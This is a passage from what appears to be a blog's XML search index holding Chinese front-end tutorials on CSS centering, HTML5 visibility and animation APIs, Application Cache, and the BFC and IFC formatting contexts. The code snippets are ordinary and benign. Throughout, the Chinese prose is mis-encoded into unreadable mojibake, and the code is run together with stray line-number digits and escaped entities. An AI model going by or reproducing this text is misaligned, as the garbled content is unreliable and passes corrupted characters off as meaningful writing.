éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œä½†HTMLæ ‡ç­¾å±‚æ•°è¾ƒå¤šã€‚ 7ã€ç»å¯¹å®šä½åŠ å››è¾¹å®šä½ä¸º0ï¼Œmargin ä¸º autoã€‚123456789101112131415161718#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; top: 0; left: 0; right: 0; bottom: 0; margin: auto; position: absolute; background-color: #cccccc;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œä½†æŠŠå®šä½å±žæ€§å…¨ç”¨ä¸Šäº† 8ã€åˆ©ç”¨flexå¸ƒå±€ justify-content: center; å’Œ align-items: center; å±žæ€§å±…ä¸­ã€‚123456789101112131415#div1 &#123; width: 200px; height: 200px; display: flex; flex-direction: row; justify-content: center; align-items: center; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; background-color: #cccccc;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œå…¼å®¹IE10+ 9ã€åˆ©ç”¨gridå¸ƒå±€ï¼Œåˆ’åˆ†æˆ3x3æ …æ ¼ï¼Œç¬¬äºŒè¡Œç¬¬äºŒåˆ—æ ¼å­åž‚ç›´æ°´å¹³å±…ä¸­12345678910111213141516#div1 &#123; width: 200px; height: 200px; display: grid; background-color: #ffff00; grid-template-columns: repeat(3, 1fr); grid-template-rows: repeat(3, 1fr);&#125;#div2 &#123; width: 100px; height: 100px; background-color: #cccccc; grid-row-start: 2; grid-column-start: 2;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œå…¼å®¹æ€§Firefox 52, Safari 10.1, Chrome 57, Opera 44 10ã€åˆ©ç”¨flexæˆ–gridå¸ƒå±€ç»“åˆ margin: auto;123456789101112#div1 &#123; width: 200px; height: 200px; display: flex; /* display: grid; */&#125;#div2 &#123; width: 100px; height: 100px; margin: auto;&#125; æ³¨ï¼šæ­¤æ–¹æ³•æœ€ç®€æ´ï¼Œ ä½†æ˜¯ flex/grid å­˜åœ¨å…¼å®¹æ€§é—®é¢˜]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5 æ–°åž‹api]]></title>
    <url>%2F2018%2F05%2F24%2Fhtml5%20%E6%96%B0%E5%9E%8Bapi%2F</url>
    <content type="text"><![CDATA[Page Visibility APIä¸ºäº†è§£å†³éšè—æˆ–æœ€å°åŒ–æ ‡ç­¾é¡µï¼Œè®©å¼€å‘äººå‘˜çŸ¥é“ï¼Œæœ‰å“ªäº›åŠŸèƒ½å¯ä»¥åœä¸‹æ¥ï¼Œ```,``` visibilitychange ```äº‹ä»¶12 document.addEventListener(â€˜msvisibilitychangeâ€™, handleVisibilityChange);document.addEventListener(â€˜webkitvisibilitychangeâ€™, handleVisibilityChange); function handleVisibilityChange () { var msg = â€˜â€™; // æ£€æµ‹å½“å‰é¡µé¢æ˜¯å¦è¢«éšè— if (document.hidden || document.msHidden || document.webkitHidden) { msg = &apos;Page has hidden&apos; + new Date(); } else { msg = &apos;Page is visible now &apos; + new Date(); } console.log(msg); }12345678910111213141516171819202122232425262728293031323334353637383940### requestAnimationFrameä½¿ç”¨åŽŸå§‹çš„`setTimeout`å’Œ`setInterval`å®šæ—¶å™¨æ–¹æ³•åˆ›å»ºåŠ¨ç”»ä¸ç²¾ç¡®ï¼ŒHTML5ä¼˜åŒ–è¿™ä¸ªé—®é¢˜ï¼Œæä¾›ä¸€ä¸ªapiï¼Œé¿å…è¿‡åº¦æ¸²æŸ“ï¼Œè§£å†³ç²¾åº¦ä½Žé—®é¢˜ã€‚```javascriptvar requestAnimationFrame = window.requestAnimationFrame || window.msRequestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;var startTime = window.mozRequestAnimationStartTime || Date.now();requestAnimationFrame(draw);var dist = 500;var start = 0;var step = 10;var $block = document.getElementById(&apos;block&apos;);function draw (timestamp) &#123; var drawStart = (timestamp || Date.now()); var diff = drawStart - startTime; var next = start + step; $block.style.left = next + &apos;px&apos;; start = next; if(start &gt; dist) &#123; // cancelAnimationFrame(); return false; &#125; console.log(&apos;diff:&apos;, diff); // æŠŠstartTimeé‡å†™ä¸ºè¿™ä¸€æ¬¡çš„ç»˜åˆ¶æ—¶é—´ startTime = drawStart; // é‡ç»˜UI requestAnimationFrame(draw);&#125;]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html5</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5ç¦»çº¿å­˜å‚¨ä¹‹Application Cache]]></title>
    <url>%2F2018%2F05%2F23%2FHTML5%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8%E4%B9%8BApplication%20Cache%2F</url>
    <content type="text"><![CDATA[å…³äºŽhtml5çš„ç¦»çº¿å­˜å‚¨ï¼Œå¤§è‡´å¯åˆ†ä¸ºï¼š localStorage, sessionStorage indexedDB web sql application cache å¯ä»¥åœ¨chromeçš„debugå·¥å…·/Resourcesä¸‹äº§çœ‹ï¼Œä¸‹é¢æ¥ç€é‡è¯´æ˜Žä¸€ä¸‹Application Cacheã€‚ è®¿é—®æµç¨‹ å½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡æ­£ç¡®é…ç½®app cacheåŽï¼Œå½“æˆ‘ä»¬å†æ¬¡è®¿é—®è¯¥åº”ç”¨æ—¶ï¼Œæµè§ˆå™¨ä¼šé¦–å…ˆæ£€æŸ¥manifestæ–‡ä»¶æ˜¯å¦æœ‰å˜åŠ¨ï¼Œå¦‚æžœæœ‰å˜åŠ¨å°±ä¼šæŠŠç›¸åº”çš„å˜å¾—è·Ÿæ–°ä¸‹æ¥ï¼ŒåŒæ—¶æ”¹å˜æµè§ˆå™¨é‡Œé¢çš„app cacheï¼Œå¦‚æžœæ²¡æœ‰å˜åŠ¨ï¼Œå°±ä¼šç›´æŽ¥æŠŠapp cacheçš„èµ„æºè¿”å›žï¼ŒåŸºæœ¬æµç¨‹æ˜¯è¿™æ ·çš„ã€‚ ç‰¹ç‚¹ ç¦»çº¿æµè§ˆ: ç”¨æˆ·å¯ä»¥åœ¨ç¦»çº¿çŠ¶æ€ä¸‹æµè§ˆç½‘ç«™å†…å®¹ æ›´å¿«çš„é€Ÿåº¦: å› ä¸ºæ•°æ®è¢«å­˜å‚¨åœ¨æœ¬åœ°ï¼Œæ‰€ä»¥é€Ÿåº¦ä¼šæ›´å¿« å‡è½»æœåŠ¡å™¨çš„è´Ÿè½½: æµè§ˆå™¨åªä¼šä¸‹è½½åœ¨æœåŠ¡å™¨ä¸Šå‘ç”Ÿæ”¹å˜çš„èµ„æº å¦‚ä½•ä½¿ç”¨é¦–å…ˆï¼Œæˆ‘ä»¬å»ºç«‹ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œç±»ä¼¼è¿™æ ·ï¼š 1234&lt;html lang=&quot;en&quot; mainfest=&quot;index.manifest&quot;&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;&lt;/body&gt;&lt;/html&gt; å¯èƒ½æœ‰äº›ä»£ç çœ‹ä¸æ‡‚ï¼Œæˆ‘ä»¬å…ˆçœ‹æœ€ç®€å•çš„ï¼Œç¬¬ä¸€è¡Œé…ç½®äº†ä¸€ä¸ªmanifest=â€manifest.appcacheâ€ï¼ˆæ³¨æ„æ˜¯maniä¸æ˜¯mainï¼‰ï¼Œè¿™æ˜¯ä½¿ç”¨app cacheé¦–å…ˆè¦é…ç½®çš„ï¼Œç„¶åŽæˆ‘ä»¬åœ¨è¿™ä¸ªhtmlæ–‡ä»¶é‡Œå¼•å…¥äº†ä¸¤ä¸ªimgåšä¸ºæµ‹è¯•ç”¨ï¼Œç„¶åŽç›‘å¬äº†loadæ—¶é—´æ¥æŸ¥çœ‹çœ‹applicationçš„statusï¼Œå…³äºŽapplicationCacheçš„apiï¼Œå¯ä»¥æŸ¥çœ‹ã€‚ ç„¶åŽåœ¨ç›¸åŒç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªmanifest.appcacheæ–‡ä»¶ï¼Œæ³¨æ„å…³äºŽè·¯å¾„è¦å’Œhtmlé¡µé¢é…ç½®æ—¶ä¸€è‡´å³å¯ã€‚ 123456789CACHE MANIFEST#version 1.3CACHE:img/1.jpgimg/2.jpgtest.cssNETWORK:* å…³äºŽmanifest.appcacheæ–‡ä»¶ï¼ŒåŸºæœ¬æ ¼å¼ä¸ºä¸‰æ®µï¼š CACHEï¼ŒNETWORKï¼Œä¸Ž FALLBACKï¼Œå…¶ä¸­NETWORKå’ŒFALLBACKä¸ºå¯é€‰é¡¹ï¼Œè€Œç¬¬ä¸€è¡ŒCACHE MANIFESTä¸ºå›ºå®šæ ¼å¼ï¼Œå¿…é¡»å†™åœ¨å‰é¢ã€‚ CACHE:ï¼ˆå¿…é¡»ï¼‰ æ ‡è¯†å‡ºå“ªäº›æ–‡ä»¶éœ€è¦ç¼“å­˜ï¼Œå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚ä¾‹å¦‚ï¼šaa.cssï¼Œhttp://www.baidu.com/aa.js. NETWORK:ï¼ˆå¯é€‰ï¼‰ è¿™ä¸€éƒ¨åˆ†æ˜¯è¦ç»•è¿‡ç¼“å­˜ç›´æŽ¥è¯»å–çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼Šï¼Œ,ä¹Ÿå°±æ˜¯è¯´é™¤äº†ä¸Šé¢çš„cacheæ–‡ä»¶ï¼Œå‰©ä¸‹çš„æ–‡ä»¶æ¯æ¬¡éƒ½è¦é‡æ–°æ‹‰å–ã€‚ä¾‹å¦‚ï¼Šï¼Œlogin.phpã€‚ FALLBACK:ï¼ˆå¯é€‰ï¼‰ æŒ‡å®šäº†ä¸€ä¸ªåŽå¤‡é¡µé¢ï¼Œå½“èµ„æºæ— æ³•è®¿é—®æ—¶ï¼Œæµè§ˆå™¨ä¼šä½¿ç”¨è¯¥é¡µé¢ã€‚è¯¥æ®µè½çš„æ¯æ¡è®°å½•éƒ½åˆ—å‡ºä¸¤ä¸ª URIâ€”ç¬¬ä¸€ä¸ªè¡¨ç¤ºèµ„æºï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºåŽå¤‡é¡µé¢ã€‚ä¸¤ä¸ª URI éƒ½å¿…é¡»ä½¿ç”¨ç›¸å¯¹è·¯å¾„å¹¶ä¸”ä¸Žæ¸…å•æ–‡ä»¶åŒæºã€‚å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ã€‚ä¾‹å¦‚*.html /offline.htmlã€‚ æœ‰äº†ä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶ä¹‹åŽè¿˜è¦é…ç½®æœåŠ¡å™¨çš„mime.typesç±»åž‹ï¼Œæ‰¾å¤§ç›˜apacheçš„mime.typesæ–‡ä»¶ï¼Œæ·»åŠ  1text/cache-manifest .appcache OKï¼Œä¸Šé¢æ–‡ä»¶é…ç½®å®Œæˆä¹‹åŽï¼Œapplication cacheå°±å¯ä»¥è¿è¡Œäº†ã€‚æŸ¥çœ‹consoleï¼š å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸‹å­è¿™ä¹ˆå¤šlogï¼Œä½†æ˜¯é™¤äº†4æ˜¯æˆ‘ä»¬consoleçš„logä¹‹å¤–ï¼Œå…¶ä»–çš„éƒ½æ˜¯appcacheè‡ªå·±æ‰“çš„ï¼Œå› ä¸ºæˆ‘ä»¬é…ç½®äº†manifestï¼Œç³»ç»Ÿä¼šé»˜è®¤æ‰“å‡ºappcacheçš„logã€‚å…³äºŽstatusçš„å€¼ï¼š ç„¶åŽï¼Œé€šè¿‡logï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€äº›æ–‡ä»¶å·²ç»è¢«ç¼“å­˜ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹chrome Resourcesæ¥æŸ¥çœ‹ï¼š è¯æ˜Žç›´æŽ¥ä»Žç¼“å­˜æ‹¿åŽ»æ–‡ä»¶ï¼š æ›´æ–°ç¼“å­˜çš„æ–¹å¼ æ›´æ–°manifestæ–‡ä»¶ æµè§ˆå™¨å‘çŽ°manifestæ–‡ä»¶æœ¬èº«å‘ç”Ÿå˜åŒ–ï¼Œä¾¿ä¼šæ ¹æ®æ–°çš„manifestæ–‡ä»¶åŽ»èŽ·å–æ–°çš„èµ„æºè¿›è¡Œç¼“å­˜ã€‚ å½“manifestæ–‡ä»¶åˆ—è¡¨å¹¶æ²¡æœ‰å˜åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸é€šè¿‡ä¿®æ”¹manifestæ³¨é‡Šçš„æ–¹å¼æ¥æ”¹å˜æ–‡ä»¶ï¼Œä»Žè€Œå®žçŽ°æ›´æ–°ã€‚ é€šè¿‡javascriptæ“ä½œ æµè§ˆå™¨æä¾›äº†applicationCacheä¾›jsè®¿é—®ï¼Œé€šè¿‡å¯¹äºŽapplicationCacheå¯¹è±¡çš„æ“ä½œä¹Ÿèƒ½è¾¾åˆ°æ›´æ–°ç¼“å­˜çš„ç›®çš„ã€‚ æ¸…é™¤æµè§ˆå™¨ç¼“å­˜ å¯¹äºŽç¬¬ä¸€ç§ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹manifestæ–‡ä»¶ï¼ŒæŠŠversionæ”¹ä¸º1.4ï¼Œç„¶åŽåˆ·æ–°é¡µé¢ã€‚ æˆ‘ä»¬å¯ä»¥å‘çŽ°ï¼Œappcacheæ›´æ–°äº†ç¼“å­˜é‡æ–°ä»Žç½‘ç»œä¸Šæ‹‰åŽ»çš„cacheçš„æ–‡ä»¶ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å¦‚æžœæƒ³è¦çœ‹åˆ°æ”¹å˜ï¼Œå¿…é¡»å†æ¬¡åˆ·æ–°é¡µé¢ã€‚ å¯¹äºŽç¬¬äºŒç§æ–¹æ³•ï¼Œæˆ‘ä»¬é¦–å…ˆä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„jsï¼Œæ·»åŠ ä¸€ä¸ªç›‘å¬äº‹ä»¶ï¼š 1234window.applicationCache.addEventListener(&apos;updateready&apos;, function()&#123; console.log(&apos;updateready!&apos;); window.applicationCache.swapCache();&#125;); æ¸…é™¤æµè§ˆå™¨ç¼“å­˜å†è¯•ä¸€æ¬¡ï¼Œè¿™æ¬¡æˆ‘ä»¬åœ¨consoleé‡Œè°ƒç”¨window.applicationCache.update();ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆï¼š updatereadyäº‹ä»¶è§¦å‘äº†ï¼ŒåŒæ ·ï¼Œappcacheä¹Ÿæ›´æ–°äº†ç¼“å­˜ï¼Œå…¶ä¸­swapCacheæ–¹æ³•çš„æ„æ€æ˜¯é‡æ–°åº”ç”¨è·Ÿæ–°åŽçš„ç¼“å­˜æ¥æ›¿æ¢åŽŸæ¥çš„ç¼“å­˜ï¼ï¼Œåˆ°è¿™é‡ŒåŽåŸºæœ¬çš„appcacheä¹Ÿå·®ä¸å¤šäº†ã€‚ æ³¨æ„äº‹é¡¹ï¼š ç«™ç‚¹ç¦»çº¿å­˜å‚¨çš„å®¹é‡é™åˆ¶æ˜¯5M å¦‚æžœmanifestæ–‡ä»¶ï¼Œæˆ–è€…å†…éƒ¨åˆ—ä¸¾çš„æŸä¸€ä¸ªæ–‡ä»¶ä¸èƒ½æ­£å¸¸ä¸‹è½½ï¼Œæ•´ä¸ªæ›´æ–°è¿‡ç¨‹å°†è§†ä¸ºå¤±è´¥ï¼Œæµè§ˆå™¨ç»§ç»­å…¨éƒ¨ä½¿ç”¨è€çš„ç¼“å­˜ å¼•ç”¨manifestçš„htmlå¿…é¡»ä¸Žmanifestæ–‡ä»¶åŒæºï¼Œåœ¨åŒä¸€ä¸ªåŸŸä¸‹ FALLBACKä¸­çš„èµ„æºå¿…é¡»å’Œmanifestæ–‡ä»¶åŒæº å½“ä¸€ä¸ªèµ„æºè¢«ç¼“å­˜åŽï¼Œè¯¥æµè§ˆå™¨ç›´æŽ¥è¯·æ±‚è¿™ä¸ªç»å¯¹è·¯å¾„ä¹Ÿä¼šè®¿é—®ç¼“å­˜ä¸­çš„èµ„æºã€‚ ç«™ç‚¹ä¸­çš„å…¶ä»–é¡µé¢å³ä½¿æ²¡æœ‰è®¾ç½®manifestå±žæ€§ï¼Œè¯·æ±‚çš„èµ„æºå¦‚æžœåœ¨ç¼“å­˜ä¸­ä¹Ÿä»Žç¼“å­˜ä¸­è®¿é—® å½“manifestæ–‡ä»¶å‘ç”Ÿæ”¹å˜æ—¶ï¼Œèµ„æºè¯·æ±‚æœ¬èº«ä¹Ÿä¼šè§¦å‘æ›´æ–°]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html5</tag>
        <tag>ç¼“å­˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£BFC]]></title>
    <url>%2F2018%2F05%2F21%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3BFC%2F</url>
    <content type="text"><![CDATA[1ã€ç›¸å…³å®šä¹‰1.1 Formatting contextFormatting context æ˜¯ W3C CSS2.1 è§„å®šä¸­çš„ä¸€ä¸ªæ¦‚å¿µã€‚å®ƒæ˜¯é¡µé¢ä¸­çš„ä¸€å—æ¸²æŸ“åŒºåŸŸï¼Œå¹¶ä¸”æœ‰ä¸€å¥—æ¸²æŸ“è§„åˆ™ï¼Œå®ƒå†³å®šäº†å…¶å­å…ƒç´ å¦‚ä½•å®šä½ï¼Œä»¥åŠå’Œå…¶ä»–å…ƒç´ çš„å…³ç³»å’Œç›¸äº’ä½œç”¨ã€‚æœ€å¸¸è§çš„ Formatting context æœ‰ Block formatting contextï¼ˆç®€ç§° BFCï¼‰å’Œ Inline formatting contextï¼ˆç®€ç§° IFCï¼‰ã€‚css2.1 ä¸­åªæœ‰ BFC å’Œ IFCï¼Œcss3 ä¸­è¿˜å¢žåŠ äº† GFC å’Œ FFCã€‚ 1.2 BFC å®šä¹‰BFC(Block formatting context)ç›´è¯‘ä¸ºâ€œå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡â€ã€‚å®ƒæ˜¯ç‹¬ç«‹çš„æ¸²æŸ“åŒºåŸŸï¼Œå—æ ¼å¼ä¸Šä¸‹æ–‡æ˜¯é¡µé¢ CSS è§†è§‰æ¸²æŸ“çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºŽå†³å®šå—ç›’å­çš„å¸ƒå±€åŠæµ®åŠ¨ç›¸äº’å½±å“èŒƒå›´çš„ä¸€ä¸ªåŒºåŸŸã€‚ 1.3 BFC å¸ƒå±€è§„åˆ™ï¼š å†…éƒ¨çš„ Box ä¼šåœ¨åž‚ç›´æ–¹å‘ï¼Œä¸€ä¸ªæŽ¥ä¸€ä¸ªåœ°æ”¾ç½®ï¼› Box åž‚ç›´æ–¹å‘åœ°è·ç¦»ç”± margin å†³å®šã€‚å±žäºŽåŒä¸€ä¸ª BFC çš„ä¸¤ä¸ªç›¸é‚» Box çš„ margin ä¼šå‘ç”Ÿé‡å  æ¯ä¸ªå…ƒç´ çš„ margin box çš„å·¦è¾¹ï¼Œä¸ŽåŒ…å«å— border box çš„å·¦è¾¹ç›¸æŽ¥è§¦ï¼ˆå¯¹äºŽä»Žå·¦å¾€å³çš„æ ¼å¼åŒ–ï¼Œå¦åˆ™ç›¸åï¼‰ã€‚å³ä¾¿å­˜åœ¨æµ®åŠ¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ BFC çš„åŒºåŸŸä¸ä¼šä¸Ž float box é‡å ã€‚ BFC å°±æ˜¯é¡µé¢çš„ä¸€ä¸ªéš”ç¦»çš„ç‹¬ç«‹å®¹å™¨ï¼Œå®¹å™¨é‡Œé¢çš„å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–é¢çš„å…ƒç´ ã€‚åä¹‹ä¹Ÿå¦‚æ­¤ã€‚ è®¡ç®— BFC çš„é«˜åº¦æ—¶ï¼Œæµ®åŠ¨å…ƒç´ ä¹Ÿå‚ä¸Žè®¡ç®—ã€‚ 2ã€ä½œç”¨2.1 å¯ç”Ÿæˆ BFC çš„å…ƒç´  æ ¹å…ƒç´  htmlï¼› æµ®åŠ¨å…ƒç´ ï¼ˆfloat å±žæ€§ä¸ä¸º noneï¼‰ï¼› ç»å¯¹å®šä½å…ƒç´ ï¼ˆposition ä¸º absolute æˆ– fixedï¼‰ï¼› è¡Œå†…å—å…ƒç´ ï¼ˆdisplay ä¸º inline-blockï¼‰ï¼› è¡¨æ ¼å…ƒç´ ï¼ˆdisplay ä¸º table-cellï¼Œtable-captionï¼‰ å¼¹æ€§ç›’å…ƒç´ ï¼ˆdisplay ä¸º flexï¼Œ inline-flexï¼‰ï¼› overflow ä¸ä¸º visibleï¼› 2.2 åœºæ™¯ä¸€ï¼šå¯¹äºŽä¸¤æ æˆ–ä¸‰æ æµ®åŠ¨è‡ªé€‚åº”å¸ƒå±€ï¼ŒåŒ…å«å—è¾¹æŽ¥è§¦é—®é¢˜ã€‚12345678910111213141516171819202122232425&lt;style&gt; .left-center-right.float .left &#123; float: left; width: 200px; height: 100px; background-color: rgba(0, 0, 0, 0.7); &#125; .left-center-right.float .center &#123; background-color: rgb(13, 218, 233); height: 200px; &#125; .left-center-right.float .right &#123; float: right; width: 200px; height: 150px; background-color: rgb(189, 109, 109); &#125;&lt;/style&gt;&lt;section class="left-center-right float"&gt; &lt;article class="left"&gt;æˆ‘æ˜¯å·¦è¾¹åŒºåŸŸå—&lt;/article&gt; &lt;article class="right"&gt;æˆ‘æ˜¯å³è¾¹åŒºåŸŸå—&lt;/article&gt; &lt;article class="center"&gt;æˆ‘æ˜¯ä¸­é—´åŒºåŸŸå—&lt;/article&gt;&lt;/section&gt; ä¸­é—´è‡ªé€‚åº”æ è¾¹ç•Œä¼šå»¶å±•å·¦å³æµ®åŠ¨åŒºåŸŸ æ­¤æ—¶éœ€è¦æŠŠä¸­é—´æ å˜æˆ BFC 12345.left-center-right.float .center &#123; background-color: rgb(13, 218, 233); height: 200px; overflow: hidden;&#125; 2.3 åœºæ™¯äºŒï¼šå­çº§å…ƒç´ æœ‰æµ®åŠ¨ï¼Œçˆ¶çº§å…ƒç´ å¡Œé™·é—®é¢˜12345678910111213141516171819&lt;style&gt; .all-children-float .left &#123; float: left; width: 200px; height: 100px; background-color: rgba(0, 0, 0, 0.7); &#125; .all-children-float .right &#123; float: right; width: 200px; height: 150px; background-color: rgb(189, 109, 109); &#125;&lt;/style&gt;&lt;section class="all-children-float"&gt; &lt;article class="left"&gt;æˆ‘æ˜¯å·¦è¾¹åŒºåŸŸå—&lt;/article&gt; &lt;article class="right"&gt;æˆ‘æ˜¯å³è¾¹åŒºåŸŸå—&lt;/article&gt;&lt;/section&gt; æ­¤æ—¶éœ€è¦å°†çˆ¶çº§å…ƒç´ å˜æˆ BFC 123.all-children-float &#123; position: absolute;&#125; 2.3 åœºæ™¯ä¸‰ï¼šåž‚ç›´æ–¹å‘ margin å‡ºçŽ°é‡åˆ12345678910111213141516171819&lt;style&gt; .verticle-block .block1 &#123; width: 200px; height: 150px; background-color: rgb(13, 218, 233); margin: 20px; &#125; .verticle-block .block2 &#123; width: 150px; height: 150px; background-color: rgb(189, 109, 109); margin: 30px; &#125;&lt;/style&gt;&lt;section class="verticle-block"&gt; &lt;article class="block1"&gt;æˆ‘æ˜¯åŒºåŸŸå—1&lt;/article&gt; &lt;article class="block2"&gt;æˆ‘æ˜¯åŒºåŸŸå—2&lt;/article&gt;&lt;/section&gt; Box åž‚ç›´æ–¹å‘çš„è·ç¦» margin å†³å®šï¼Œå±žäºŽåŒä¸€ä¸ª BFC çš„ä¸¤ä¸ªç›¸é‚» Box çš„ margin ä¼šå‘ç”Ÿé‡å ã€‚ æˆ‘ä»¬çš„åšæ³•æ˜¯åŒ…ä¸€å±‚æ ‡ç­¾ï¼Œå¹¶è½¬åŒ–æˆ BFCã€‚ 12345678.wrapper1 &#123; overflow: hidden; &#125;&lt;section class="verticle-block"&gt; &lt;div class="wrapper1"&gt; &lt;article class="block1"&gt;æˆ‘æ˜¯åŒºåŸŸå—1&lt;/article&gt; &lt;/div&gt; &lt;article class="block2"&gt;æˆ‘æ˜¯åŒºåŸŸå—2&lt;/article&gt;&lt;/section&gt; å‚è€ƒåŠ æ·±ç†è§£ BFCå­¦ä¹  BFC (Block Formatting Context)]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css BFC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£IFC]]></title>
    <url>%2F2018%2F05%2F20%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3IFC%2F</url>
    <content type="text"><![CDATA[æ¦‚å¿µè§„åˆ™ FC(Inline formatting context)ï¼Œå³è¡Œå†…æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œå®ƒå’ŒBFCä¸€æ ·ï¼Œæ—¢ä¸æ˜¯å±žæ€§ä¹Ÿä¸æ˜¯å…ƒç´ ï¼Œè€Œæ˜¯ä¸€ç§ï¼Œä¸€ç§ä¸Šä¸‹æ–‡ã€‚ åœ¨IFCä¸­ï¼Œæ¡†ï¼ˆboxsï¼‰ä¸€ä¸ªæŽ¥ä¸€ä¸ªæ°´å¹³æŽ’åˆ—ï¼Œèµ·ç‚¹æ˜¯åŒ…å«å—çš„é¡¶éƒ¨ã€‚æ°´å¹³æ–¹å‘ä¸Šçš„marginï¼Œborderå’Œpaddingåœ¨æ¡†ä¹‹é—´å¾—åˆ°ä¿ç•™ã€‚æ¡†åœ¨åž‚ç›´æ–¹å‘ä¸Šå¯ä»¥ä»¥ä¸åŒçš„æ–¹å¼å¯¹é½ï¼šå®ƒä»¬çš„é¡¶éƒ¨æˆ–åº•éƒ¨å¯¹é½ï¼Œæˆ–æ ¹æ®å…¶ä¸­æ–‡å­—çš„åŸºçº¿å¯¹é½ã€‚åŒ…æ‹¬é‚£äº›æ¡†çš„é•¿æ–¹å½¢åŒºåŸŸï¼Œä¼šå½¢æˆä¸€è¡Œï¼Œå«åšè¡Œæ¡†ï¼ˆline boxï¼‰ã€‚ ä¸€ä¸ªline boxçš„å®½åº¦ç”±åŒ…å«å®ƒçš„å…ƒç´ çš„å®½åº¦å’ŒåŒ…å«å®ƒçš„å…ƒç´ é‡Œé¢æœ‰æ²¡æœ‰floatå…ƒç´ æ¥å†³å®šï¼Œè€Œé«˜åº¦ç”±å†…éƒ¨å…ƒç´ ä¸­å®žé™…é«˜åº¦æœ€é«˜çš„å…ƒç´ è®¡ç®—å‡ºæ¥ã€‚ line boxçš„é«˜åº¦æ˜¯è¶³å¤Ÿé«˜æ¥åŒ…å«ä»–å†…éƒ¨å®¹å™¨ä»¬çš„ï¼Œä¹Ÿå¯èƒ½ä¸æ¯”å®ƒåŒ…å«çš„å®¹å™¨ä»¬éƒ½é«˜ï¼ˆæ¯”å¦‚åœ¨åŸºçº¿å¯¹é½çš„æ—¶å€™ï¼‰ï¼Œå½“å®ƒåŒ…å«çš„å†…éƒ¨å®¹å™¨çš„é«˜åº¦å°äºŽline boxçš„é«˜åº¦æ—¶ï¼Œå†…éƒ¨å®¹å™¨çš„åž‚ç›´ä½ç½®ç”±è‡ªå·±çš„verticalè¿™ä¸ªå±žæ€§æ¥ç¡®å®šã€‚å½“å†…éƒ¨çš„å®¹å™¨ç›’å­å¤ªå¤šï¼Œä¸€ä¸ªline boxè£…ä¸ä¸‹ï¼Œå®ƒä»¬æŠ˜è¡Œä¹‹åŽä¼šå˜æˆä¸¤ä¸ªæˆ–å¤šä¸ªline boxï¼Œline boxä»¬ç›¸äº’ä¹‹é—´åž‚ç›´æ–¹å‘ä¸èƒ½åˆ†ç¦»ï¼Œä¸èƒ½é‡å ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œline boxçš„å·¦è¾¹ç¼˜æŒ¨ç€åŒ…å«å®ƒçš„å…ƒç´ çš„å·¦è¾¹ç¼˜ï¼Œå¹¶ä¸”å³è¾¹ç¼˜æŒ¨ç€åŒ…å«å®ƒçš„å…ƒç´ çš„å³è¾¹ç¼˜ï¼Œæµ®åŠ¨å…ƒç´ ä¼šåœ¨åŒ…å«ä»–ä»¬å…ƒç´ çš„è¾¹ç¼˜å’Œline boxçš„è¾¹ç¼˜ä¹‹é—´ï¼Œæ‰€ä»¥ï¼Œè™½ç„¶åœ¨åŒä¸€ä¸ªIFCä¸‹çš„line boxä»¬é€šå¸¸æ‹¥æœ‰ç›¸åŒçš„å®½åº¦ï¼ˆå°±æ˜¯åŒ…å«å®ƒä»¬å®¹å™¨çš„å®½åº¦ï¼‰ï¼Œä½†æ˜¯ä¹Ÿä¼šå› ä¸ºæµ®åŠ¨å…ƒç´ æ£ä¹±ï¼Œå¯¼è‡´line boxä»¬çš„å¯ç”¨å®½åº¦äº§ç”Ÿå˜åŒ–ä¸ä¸€æ ·äº†ã€‚åœ¨åŒä¸€ä¸ªIFCä¸‹çš„line boxä»¬çš„é«˜åº¦ä¹Ÿä¼šä¸ä¸€æ ·ï¼ˆæ¯”å¦‚è¯´ï¼Œä¸€ä¸ªline 